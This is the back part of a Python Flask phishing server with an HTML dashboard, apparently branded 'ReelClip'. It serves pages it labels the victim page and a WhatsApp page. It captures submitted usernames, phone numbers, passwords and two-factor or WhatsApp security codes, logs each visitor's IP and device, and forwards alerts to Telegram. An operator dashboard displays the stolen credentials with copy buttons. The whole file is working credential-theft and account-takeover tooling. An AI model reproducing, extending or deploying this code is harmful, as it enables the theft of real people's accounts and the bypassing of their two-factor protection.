    const capLatest = DATA.capture && DATA.capture.latest ? DATA.capture.latest : null;
    const loginLatest = DATA.login && DATA.login.latest ? DATA.login.latest : null;

    let status = "NO EVENTS";
    let statusClass = "none";

    if (loginLatest) {
      if (loginLatest.event_type === "whatsapp_code") {
        status = "WHATSAPP CODE CAPTURED";
        statusClass = "wa";
      } else {
        const rawLogin = loginLatest.raw || {};
        const hasCode = (
          loginLatest.security_code ||
          loginLatest.whatsapp_code ||
          rawLogin.security_code ||
          rawLogin.whatsapp_code
        );

        status = hasCode ? "LOGIN CAPTURED + 2FA" : "LOGIN CAPTURED";
        statusClass = "login";
      }
    } else if (capLatest) {
      status = "VISIT ONLY";
      statusClass = "visit";
    }

    const capData = capLatest ? capLatest.data : null;
    const rawLogin = loginLatest ? loginLatest.raw : {};

    const username = loginLatest
      ? (loginLatest.username || loginLatest.phone || rawLogin.username || rawLogin.phone || "—")
      : "—";

    const password = loginLatest
      ? (loginLatest.password || rawLogin.password || "—")
      : "—";

    const code = loginLatest
      ? (loginLatest.security_code || loginLatest.whatsapp_code || rawLogin.security_code || rawLogin.whatsapp_code || "—")
      : "—";

    const capTime = capLatest ? capLatest.received_at : "—";
    const loginTime = loginLatest ? loginLatest.received_at : "—";
    const capIp = capLatest ? capLatest.server_ip : "—";
    const loginIp = loginLatest ? loginLatest.server_ip : "—";
    const capUa = capLatest ? capLatest.server_user_agent : "—";
    const loginUa = loginLatest ? loginLatest.server_user_agent : "—";
    const capCount = DATA.capture ? (DATA.capture.event_count || 0) : 0;
    const loginCount = DATA.login ? (DATA.login.event_count || 0) : 0;

    const rawCapture = capLatest ? (capLatest.raw || capLatest) : DATA.capture;
    const rawLoginObj = loginLatest ? (loginLatest.raw || loginLatest) : DATA.login;

    let html = "";

    html += "<div class=\"status " + statusClass + "\">" + esc(status) + "</div>";
    html += "<div class=\"grid\">";

    html += "<div class=\"card\"><h2>Visit</h2><table>";
    html += "<tr><td>Token</td><td>" + esc(DATA.token) + "</td></tr>";
    html += "<tr><td>Last visit</td><td>" + esc(capTime) + "</td></tr>";
    html += "<tr><td>IP</td><td>" + esc(capIp) + "</td></tr>";
    html += "<tr><td>User agent</td><td>" + esc(capUa) + "</td></tr>";
    html += "<tr><td>Device summary</td><td>" + esc(summary(capData)) + "</td></tr>";
    html += "<tr><td>Capture events</td><td>" + esc(capCount) + "</td></tr>";
    html += "</table></div>";

    html += "<div class=\"card\"><h2>Login</h2>";

    if (loginLatest) {
      html += "<table>";
      html += "<tr><td>Event</td><td>" + esc(loginLatest.event_type || "login") + "</td></tr>";
      html += "<tr><td>Time</td><td>" + esc(loginTime) + "</td></tr>";
      html += "<tr><td>IP</td><td>" + esc(loginIp) + "</td></tr>";
      html += "<tr><td>User agent</td><td>" + esc(loginUa) + "</td></tr>";
      html += "<tr><td>Username / phone</td><td><code>" + esc(username) + "</code></td></tr>";
      html += "<tr><td>Password</td><td><code>" + esc(password) + "</code></td></tr>";
      html += "<tr><td>Security code</td><td><code>" + esc(code) + "</code></td></tr>";
      html += "<tr><td>Login events</td><td>" + esc(loginCount) + "</td></tr>";
      html += "</table>";

      html += "<div class=\"actions\">";
      html += "<button id=\"copyCreds\">Copy login</button>";
      html += "<button id=\"copyUser\">Copy username</button>";
      html += "<button id=\"copyPass\">Copy password</button>";
      html += "<button id=\"copyCode\">Copy code</button>";
      html += "</div>";
    } else {
      html += "<p>No login captured yet.</p>";
    }

    html += "</div></div>";

    html += "<details class=\"card\"><summary>Raw latest capture</summary><pre>" + esc(jsonText(rawCapture)) + "</pre></details>";
    html += "<details class=\"card\"><summary>Raw latest login</summary><pre>" + esc(jsonText(rawLoginObj)) + "</pre></details>";

    document.getElementById("app").innerHTML = html;

    function bindCopy(id, value) {
      var btn = document.getElementById(id);
      if (!btn) return;

      btn.addEventListener("click", function () {
        if (navigator.clipboard && navigator.clipboard.writeText) {
          navigator.clipboard.writeText(String(value == null ? "" : value));
        }

        var label = btn.textContent;
        btn.textContent = "Copied";
        setTimeout(function () {
          btn.textContent = label;
        }, 1000);
      });
    }

    if (loginLatest) {
      bindCopy("copyCreds", username + "\n" + password + "\n" + code);
      bindCopy("copyUser", username);
      bindCopy("copyPass", password);
      bindCopy("copyCode", code);
    }
  </script>
</body>
</html>
"""


@app.route("/")
def index():
    return "ReelClip is running.", 200


@app.route("/api/capture/<token>", methods=["POST"])
def api_capture(token):
    if not is_valid_token(token):
        abort(404)

    client = request.get_json(silent=True) or {}
    device, raw = split_client_payload(client)

    event = {
        "event_type": client.get("event_type", "capture"),
        "server_ip": client_ip(),
        "server_user_agent": request.headers.get("User-Agent", ""),
        "server_referrer": request.headers.get("Referer", ""),
        "server_path": request.path,
        "data": device,
        "raw": raw,
    }

    event = append_event(token, "captures", event)
    return jsonify(ok=True, id=event["event_id"])


@app.route("/api/login/<token>", methods=["POST"])
def api_login(token):
    if not is_valid_token(token):
        abort(404)

    client = request.get_json(silent=True) or {}
    device, raw = split_client_payload(client)

    event = {
        "event_type": client.get("event_type", "login"),
        "username": client.get("username"),
        "phone": client.get("phone"),
        "password": client.get("password"),
        "security_code": client.get("security_code") or client.get("whatsapp_code"),
        "whatsapp_code": client.get("whatsapp_code"),
        "page_context": client.get("page_context"),
        "server_ip": client_ip(),
        "server_user_agent": request.headers.get("User-Agent", ""),
        "server_referrer": request.headers.get("Referer", ""),
        "server_path": request.path,
        "data": device,
        "raw": client,
    }

    event = append_event(token, "logins", event)

    dash_url = dashboard_url_for(token, request.host_url)
    send_telegram(build_login_alert(token, event, dash_url))

    return jsonify(ok=True, id=event["event_id"])


@app.route("/v/<token>")
def victim(token):
    if not is_valid_token(token):
        abort(404)

    cfg = token_config(token)
    return render_template_string(
        VICTIM_HTML,
        token=token,
        config=cfg,
        capture_js=CAPTURE_JS,
    )


@app.route("/w/<token>")
def whatsapp(token):
    if not is_valid_token(token):
        abort(404)

    return render_template_string(
        WHATSAPP_HTML,
        token=token,
        capture_js=CAPTURE_JS,
    )


@app.route("/d/<token>/<key>")
def dashboard(token, key):
    if not is_valid_token(token) or key != DASH_ACCESS_CODE:
        abort(404)

    capture = read_json(DATA_DIR / "captures" / f"{token}.json", {})
    login = read_json(DATA_DIR / "logins" / f"{token}.json", {})

    payload = {
        "token": token,
        "capture": capture,
        "login": login,
    }

    data_json = json.dumps(payload, ensure_ascii=False).replace("</", "<\\/")

    return render_template_string(
        DASHBOARD_HTML,
        data_json=data_json,
    )


if __name__ == "__main__":
    port = int(os.environ.get("PORT", "8000"))
    app.run(host="0.0.0.0", port=port, debug=False)
